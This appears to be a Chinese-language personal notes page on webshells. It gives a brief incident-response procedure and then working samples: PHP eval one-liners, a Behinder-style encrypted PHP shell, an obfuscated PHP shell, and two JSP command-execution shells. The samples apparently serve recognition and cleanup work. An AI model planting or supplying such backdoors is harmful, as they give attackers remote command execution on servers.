<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2022-08-25 Thu 21:35 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Webshell</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Webshell</h1>
</header><p>
Webshell 通常是黑客用于控制网站服务器的文件，通常以 php, jsp, asp, asp.net 等载体存在于服务器网站目录下。
</p>

<p>
Webshell 处置流程：
</p>
<ol class="org-ol">
<li>确认文件是否为正常业务文件，排除误报的情况</li>
<li>确认是 Webshell 后，若业务允许，需要立即隔离当前主机</li>
<li>进行攻击溯源，修复导致 Webshell 的相关漏洞</li>
<li>删除已存在的 Webshell</li>
<li>对当前主机进行全面排查，确保清除所有已存在的后门</li>
<li>安排主机及业务重新上线</li>
</ol>
<p>
总的来说就是：排查、清除、关站，看有没有修复的可能。
</p>

<div id="outline-container-org444bd26" class="outline-2">
<h2 id="org444bd26">PHP Webshell</h2>
<div class="outline-text-2" id="text-org444bd26">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #808080;">&lt;?php</span> <span style="color: #0000FF;">eval</span><span style="color: #707183;">(</span>$<span style="color: #BA36A5;">_POST</span><span style="color: #7388D6;">[</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">]</span><span style="color: #707183;">)</span>;<span style="color: #808080;">?&gt;</span>
</pre>
</div>

<p>
冰蝎 PHP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #808080;">&lt;?php</span>
session_start<span style="color: #707183;">()</span>;
<span style="color: #0000FF;">if</span> <span style="color: #707183;">(</span><span style="color: #0000FF;">isset</span><span style="color: #7388D6;">(</span>$<span style="color: #BA36A5;">_GET</span><span style="color: #909183;">[</span><span style="color: #008000;">'pass'</span><span style="color: #909183;">]</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
    $<span style="color: #BA36A5;">key</span> = substr<span style="color: #7388D6;">(</span>md5<span style="color: #909183;">(</span>uniqid<span style="color: #709870;">(</span>rand<span style="color: #707183;">()</span><span style="color: #709870;">)</span><span style="color: #909183;">)</span>,<span style="color: #D0372D;">16</span><span style="color: #7388D6;">)</span>;
    $<span style="color: #BA36A5;">_SESSION</span><span style="color: #7388D6;">[</span><span style="color: #008000;">'k'</span><span style="color: #7388D6;">]</span> = $<span style="color: #BA36A5;">key</span>;
    <span style="color: #0000FF;">print</span> $<span style="color: #BA36A5;">key</span>;
<span style="color: #707183;">}</span> <span style="color: #0000FF;">else</span> <span style="color: #707183;">{</span>
    $<span style="color: #BA36A5;">key</span> = $<span style="color: #BA36A5;">_SESSION</span><span style="color: #7388D6;">[</span><span style="color: #008000;">'k'</span><span style="color: #7388D6;">]</span>;
    $<span style="color: #BA36A5;">post</span> = file_get_contents<span style="color: #7388D6;">(</span><span style="color: #008000;">"php://input"</span><span style="color: #7388D6;">)</span>;
    <span style="color: #0000FF;">if</span><span style="color: #7388D6;">(</span>!extension_loaded<span style="color: #909183;">(</span><span style="color: #008000;">'openssl'</span><span style="color: #909183;">)</span><span style="color: #7388D6;">)</span> <span style="color: #7388D6;">{</span>
        $<span style="color: #BA36A5;">t</span> = <span style="color: #008000;">"base64_"</span>.<span style="color: #008000;">"decode"</span>;
        $<span style="color: #BA36A5;">post</span> = $<span style="color: #BA36A5;">t</span><span style="color: #909183;">(</span>$<span style="color: #BA36A5;">post</span>.<span style="color: #008000;">""</span><span style="color: #909183;">)</span>;
        <span style="color: #0000FF;">for</span><span style="color: #909183;">(</span>$<span style="color: #BA36A5;">i</span> = <span style="color: #D0372D;">0</span>; $<span style="color: #BA36A5;">i</span> &lt; strlen<span style="color: #709870;">(</span>$<span style="color: #BA36A5;">post</span><span style="color: #709870;">)</span>; $<span style="color: #BA36A5;">i</span>++<span style="color: #909183;">)</span> <span style="color: #909183;">{</span>
            $<span style="color: #BA36A5;">post</span><span style="color: #709870;">[</span>$<span style="color: #BA36A5;">i</span><span style="color: #709870;">]</span> = $<span style="color: #BA36A5;">post</span><span style="color: #709870;">[</span>$<span style="color: #BA36A5;">i</span><span style="color: #709870;">]</span>^$<span style="color: #BA36A5;">key</span><span style="color: #709870;">[</span>$<span style="color: #BA36A5;">i</span>+<span style="color: #D0372D;">1</span>&amp;<span style="color: #D0372D;">15</span><span style="color: #709870;">]</span>;
        <span style="color: #909183;">}</span>
    <span style="color: #7388D6;">}</span> <span style="color: #0000FF;">else</span> <span style="color: #7388D6;">{</span>
        $<span style="color: #BA36A5;">post</span> = openssl_decrypt<span style="color: #909183;">(</span>$<span style="color: #BA36A5;">post</span>, <span style="color: #008000;">"AES128"</span>, $<span style="color: #BA36A5;">key</span><span style="color: #909183;">)</span>;
    <span style="color: #7388D6;">}</span>
    $<span style="color: #BA36A5;">arr</span> = explode<span style="color: #7388D6;">(</span><span style="color: #008000;">'|'</span>,$<span style="color: #BA36A5;">post</span><span style="color: #7388D6;">)</span>;
    $<span style="color: #BA36A5;">func</span> = $<span style="color: #BA36A5;">arr</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">0</span><span style="color: #7388D6;">]</span>;
    $<span style="color: #BA36A5;">params</span> = $<span style="color: #BA36A5;">arr</span><span style="color: #7388D6;">[</span><span style="color: #D0372D;">1</span><span style="color: #7388D6;">]</span>;
    <span style="color: #0000FF;">class</span> <span style="color: #6434A3;">C</span><span style="color: #7388D6;">{</span><span style="color: #0000FF;">public</span> <span style="color: #0000FF;">function</span> <span style="color: #006699;">__construct</span><span style="color: #909183;">(</span>$<span style="color: #BA36A5;">p</span><span style="color: #909183;">)</span> <span style="color: #909183;">{</span><span style="color: #0000FF;">eval</span><span style="color: #709870;">(</span>$<span style="color: #BA36A5;">p</span>.<span style="color: #008000;">""</span><span style="color: #709870;">)</span>;<span style="color: #909183;">}</span><span style="color: #7388D6;">}</span>
    <span style="color: #0000FF;">@new</span> <span style="color: #6434A3;">C</span><span style="color: #7388D6;">(</span>$<span style="color: #BA36A5;">params</span><span style="color: #7388D6;">)</span>;
<span style="color: #707183;">}</span>
<span style="color: #808080;">?&gt;</span>
</pre>
</div>

<p>
带混淆的 PHP Webshell
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #808080;">&lt;?php</span>
<span style="color: #0000FF;">function</span> <span style="color: #006699;">iJG</span><span style="color: #707183;">(</span>$<span style="color: #BA36A5;">BHM</span><span style="color: #707183;">)</span> <span style="color: #707183;">{</span>
  $<span style="color: #BA36A5;">BHM</span>=gzinflate<span style="color: #7388D6;">(</span>base64_decode<span style="color: #909183;">(</span>$<span style="color: #BA36A5;">BHM</span><span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>;
  <span style="color: #0000FF;">for</span><span style="color: #7388D6;">(</span>$<span style="color: #BA36A5;">i</span>=<span style="color: #D0372D;">0</span>;$<span style="color: #BA36A5;">i</span>&lt;strlen<span style="color: #909183;">(</span>$<span style="color: #BA36A5;">BHM</span><span style="color: #909183;">)</span>;$<span style="color: #BA36A5;">i</span>++<span style="color: #7388D6;">)</span> <span style="color: #7388D6;">{</span>
    $<span style="color: #BA36A5;">BHM</span><span style="color: #909183;">[</span>$<span style="color: #BA36A5;">i</span><span style="color: #909183;">]</span> = chr<span style="color: #909183;">(</span>ord<span style="color: #709870;">(</span>$<span style="color: #BA36A5;">BHM</span><span style="color: #707183;">[</span>$<span style="color: #BA36A5;">i</span><span style="color: #707183;">]</span><span style="color: #709870;">)</span>-<span style="color: #D0372D;">1</span><span style="color: #909183;">)</span>;
  <span style="color: #7388D6;">}</span>
   <span style="color: #0000FF;">return</span> $<span style="color: #BA36A5;">BHM</span>;
 <span style="color: #707183;">}</span> <span style="color: #0000FF;">eval</span><span style="color: #707183;">(</span>iJG<span style="color: #7388D6;">(</span><span style="color: #008000;">"U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>;
<span style="color: #808080;">?&gt;</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org9757c9f" class="outline-2">
<h2 id="org9757c9f">JSP Webshell</h2>
<div class="outline-text-2" id="text-org9757c9f">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>;%&gt;
</pre>
</div>

<p>
带回显的 JSP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%
    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>.getInputStream<span style="color: #707183;">()</span>;
    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">a</span> = -<span style="color: #D0372D;">1</span>;
    <span style="color: #6434A3;">byte</span><span style="color: #707183;">[]</span> <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span><span style="color: #707183;">[</span><span style="color: #D0372D;">2048</span><span style="color: #707183;">]</span>;
    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;pre&gt;"</span><span style="color: #707183;">)</span>;
    <span style="color: #0000FF;">while</span><span style="color: #707183;">(</span><span style="color: #7388D6;">(</span>a=in.read<span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>!=-<span style="color: #D0372D;">1</span><span style="color: #707183;">){</span>
        out.println<span style="color: #7388D6;">(</span><span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span><span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>;
    <span style="color: #707183;">}</span>
    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;/pre&gt;"</span><span style="color: #707183;">)</span>;
%&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>
